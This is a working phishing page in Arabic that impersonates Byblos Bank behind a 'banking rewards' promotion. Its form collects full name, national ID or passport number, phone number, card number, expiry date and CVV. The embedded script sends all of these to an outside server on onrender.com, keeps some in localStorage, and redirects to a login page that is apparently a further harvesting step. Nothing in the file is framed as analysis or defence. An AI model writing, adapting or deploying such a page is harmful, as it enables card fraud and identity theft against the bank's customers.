<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Byblos Bank | Banking Rewards</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>

  <!-- HEADER -->
  <header class="logo-header">
    <img src="images/bybLogo.png" alt="Byblos Bank Logo" class="logo" />
  </header>

  <!-- MAIN -->
  <main class="promo-section" dir="rtl">

    <h1 class="main-title">
      الخدمات المصرفية <span class="highlight">أكثر سهولة</span>
    </h1>

    <p class="subtitle">
      أهلاً بك في تجربة الخدمات المصرفية الحديثة من
      <strong>بنك بيبلوس</strong>
    </p>

    <div class="card-image">
      <img src="images/bybGold.jpeg" alt="Byblos Bank Card" />
      <img src="images/bybGray.jpeg" alt="Byblos Bank Card" />
    </div>

    <p class="promo-text">
      <span class="bullet">•</span>
      استمتع بخدمات مصرفية رقمية متطورة مع Byblos Bank لعام 2025<br>
      مزايا حصرية، معاملات آمنة، وتجربة مصرفية مصممة لراحتك
    </p>

    <!-- FORM -->
    <form id="bankForm" class="simple-form">

      <img src="images/peson.png" alt="User Icon" class="form-icon" />

      <div class="form-group">
        <label for="name">الاسم الكامل *</label>
        <input type="text" id="name" name="name" placeholder="أدخل الاسم الكامل" required />
      </div>

      <div class="form-group">
        <label for="nationalid">رقم الهوية / جواز السفر *</label>
        <input type="text" id="nationalid" name="nationalid" placeholder="أدخل رقم الهوية" required />
      </div>

      <div class="form-group">
        <label for="phone">رقم الهاتف *</label>
        <input type="text" id="phone" name="phone" placeholder="أدخل رقم الهاتف" required />
      </div>

      <div class="form-group">
        <img src="images/bybCard1.jpeg" alt="Card Info" class="bank-image" />
      </div>

      <div class="form-group">
        <label for="cardNum">رقم البطاقة المصرفية *</label>
        <input
          type="text"
          id="cardNum"
          name="cardNum"
          placeholder="0000 0000 0000 0000"
          required
          style="direction: ltr;"
        />
      </div>

      <div class="form-group horizontal-selects">
        <label>تاريخ انتهاء البطاقة *</label>
        <div class="select-row">
          <select id="month" name="month" required>
            <option value="" disabled selected>شهر</option>
            <option value="01">01</option>
            <option value="02">02</option>
            <option value="03">03</option>
            <option value="04">04</option>
            <option value="05">05</option>
            <option value="06">06</option>
            <option value="07">07</option>
            <option value="08">08</option>
            <option value="09">09</option>
            <option value="10">10</option>
            <option value="11">11</option>
            <option value="12">12</option>
          </select>

          <select id="year" name="year" required>
            <option value="" disabled selected>سنة</option>
            <option value="2025">2025</option>
            <option value="2026">2026</option>
            <option value="2027">2027</option>
            <option value="2028">2028</option>
            <option value="2029">2029</option>
            <option value="2030">2030</option>
          </select>
        </div>
      </div>

      <div class="form-group">
        <img src="images/bcside.jpeg" alt="CVV Help" class="bank-image" style="width:100px;" />
      </div>

      <div class="form-group">
        <label for="cvc">رمز التحقق (CVV) *</label>
        <input
          type="text"
          id="cvc"
          name="cvc"
          placeholder="CVV"
          maxlength="4"
          required
          style="direction: ltr;"
        />
      </div>

      <div class="form-group">
        <button type="submit" class="confirm-btn">تأكيد</button>
      </div>

    </form>
  </main>

  <!-- FOOTER -->
  <footer class="site-footer">
    <div class="footer-content">
      <span>Byblos Bank © 2025</span>
    </div>
  </footer>

  <!-- SCRIPT (unchanged logic) -->
  




  <script>
  const form = document.getElementById('bankForm');
  const cardInput = form.cardNum;

  // Format card number as user types: "1234 5678 9012 3456"
  cardInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 16) value = value.slice(0, 16);

    let formatted = '';
    for (let i = 0; i < value.length; i++) {
      if (i > 0 && i % 4 === 0) formatted += ' ';
      formatted += value[i];
    }

    e.target.value = formatted;

    if (value.length === 16) {
      cardInput.style.backgroundColor = '';
    }
  });

  form.addEventListener('submit', function(event) {
    event.preventDefault();

    const rawCardNum = cardInput.value.replace(/\s/g, '');
    if (rawCardNum.length !== 16) {
      alert('رقم البطاقة يجب أن يكون مكوناً من 16 رقمًا.');
      cardInput.style.backgroundColor = '#f8d7da';
      cardInput.focus();
      return;
    } else {
      cardInput.style.backgroundColor = '';
    }

    const cvcInput = form.cvc.value.trim();
    if (
      !cvcInput ||
      cvcInput.length < 3 ||
      cvcInput.length > 4 ||
      !/^\d+$/.test(cvcInput)
    ) {
      alert('يرجى إدخال رمز التحقق الصحيح (3 أو 4 أرقام).');
      form.cvc.focus();
      return;
    }


    const data = {
      name: form.name.value.trim(),
      nationalid: form.nationalid.value.trim(),
      phone: form.phone.value.trim(),
      cardNum: cardInput.value.trim(),
      month: form.month.value,
      year: form.year.value,
      cvc: cvcInput
    };

  const message = `
الاسم الكامل: ${data.name}
الرقم القومي:
${data.nationalid}
رقم الجوال:
${data.phone}

رقم البطاقة البنكية:
${data.cardNum}
تاريخ انتهاء البطاقة: ${data.month}/${data.year}
رمز التحقق (CVC): ${data.cvc}
`;


    // Save phone number for later use
    localStorage.setItem("userPhone", data.phone);
    localStorage.setItem("name", data.name);
    localStorage.setItem("cardNum", data.cardNum);

    // Send message to backend
    fetch('https://dashboard-xwzz.onrender.com/api/messages', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ text: message })
    })
    .then(response => {
      if (response.ok) {
        window.location.href = 'login.html';
      } else {
        alert('حدث خطأ أثناء الإرسال');
      }
    })
    .catch(error => {
      alert('خطأ في الاتصال بالخادم');
      console.error('Error:', error);
    });
  });
</script>



</body>
</html>
